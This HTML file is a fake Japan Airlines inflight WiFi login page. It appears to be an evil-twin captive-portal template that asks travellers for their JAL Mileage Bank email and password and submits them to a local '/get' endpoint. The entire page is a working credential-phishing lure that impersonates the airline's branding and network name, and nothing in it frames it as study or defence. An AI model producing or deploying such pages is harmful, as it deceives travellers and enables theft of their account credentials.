<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Japan Airlines — Inflight WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f4e8e8;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.pass{width:100%;max-width:420px;border-radius:14px;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,0.25)}
.pass-top{background:#CC0000;padding:0}
.header{padding:22px 24px 16px;display:flex;align-items:center;justify-content:space-between}
.airline-name{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;font-size:24px;font-weight:800;color:#fff;letter-spacing:1px}
.tail-logo{font-size:28px;opacity:0.85}
.route-bar{background:#AA0000;padding:10px 24px;display:flex;align-items:center;justify-content:space-between}
.route-dot{width:6px;height:6px;background:#4ade80;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(74,222,128,0.3)}
.route-txt{font-size:11.5px;color:rgba(255,255,255,0.85);letter-spacing:0.3px;font-weight:500}
.route-txt strong{font-weight:700;color:#fff}
.ssid-chip{font-size:10.5px;color:rgba(255,255,255,0.6);letter-spacing:0.5px}
.tear{height:14px;background:#f4e8e8;position:relative}
.tear::before,.tear::after{content:"";position:absolute;top:-7px;width:14px;height:14px;background:#f4e8e8;border-radius:50%}
.tear::before{left:-7px}
.tear::after{right:-7px}
.tear-line{position:absolute;top:7px;left:14px;right:14px;border-top:1.5px dashed #e0e0e0}
.pass-body{background:#fff;padding:22px 24px 18px}
h2{font-size:16px;font-weight:700;color:#1a1a1a;margin-bottom:3px}
.sub{font-size:12.5px;color:#aaa;margin-bottom:16px}
.lbl{display:block;font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:1.2px;color:#888;margin-bottom:7px;margin-top:18px}
input{width:100%;padding:13px 15px;border:1.5px solid #eaeaea;border-radius:10px;font-size:15px;background:#fafafa;color:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
input:focus{outline:none;border-color:#CC0000;box-shadow:0 0 0 3px #CC000015}
input::placeholder{color:#ccc}
.btn{width:100%;padding:13px;border:none;border-radius:10px;background:#CC0000;color:#fff;font-size:13px;font-weight:800;letter-spacing:0.5px;cursor:pointer;margin-top:20px;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
.btn:active{opacity:0.9}
.terms{font-size:11px;color:#ccc;text-align:center;margin-top:12px;line-height:1.6}
.terms a{color:#CC0000;text-decoration:none}
.pass-foot{background:#fafafa;border-top:1px solid #f0f0f0;padding:11px 24px;display:flex;justify-content:space-between;align-items:center}
.pass-foot span{font-size:10.5px;color:#ccc}
.pass-foot a{font-size:10.5px;color:#CC0000;text-decoration:none}
</style>
</head>
<body>
<div class="pass">
  <div class="pass-top">
    <div class="header">
      <div class="airline-name">Japan Airlines</div>
      <div class="tail-logo">✈</div>
    </div>
    <div class="route-bar">
      <div style="display:flex;align-items:center;gap:8px"><div class="route-dot"></div><span class="route-txt">Network: <strong>JAL-WiFi</strong></span></div>
      <span class="ssid-chip">Inflight WiFi</span>
    </div>
  </div>
  <div class="tear"><div class="tear-line"></div></div>
  <div class="pass-body">
    <h2>JAL Inflight WiFi</h2>
    <p class="sub">Sign in with your JAL Mileage Bank account to connect.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your JAL Mileage Bank password" required>
      <button type="submit" class="btn">Connect Now →</button>
      <p class="terms">By connecting you agree to our <a href="#">Inflight Internet Terms</a>.</p>
    </form>
  </div>
  <div class="pass-foot">
    <span>&copy; Japan Airlines</span>
    <a href="#">Support</a>
  </div>
</div>
</body>
</html>
